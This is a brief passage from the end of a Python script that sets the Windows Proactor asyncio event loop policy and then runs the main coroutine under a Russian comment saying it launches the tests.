        asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
    
    # Запуск тестов
    asyncio.run(main())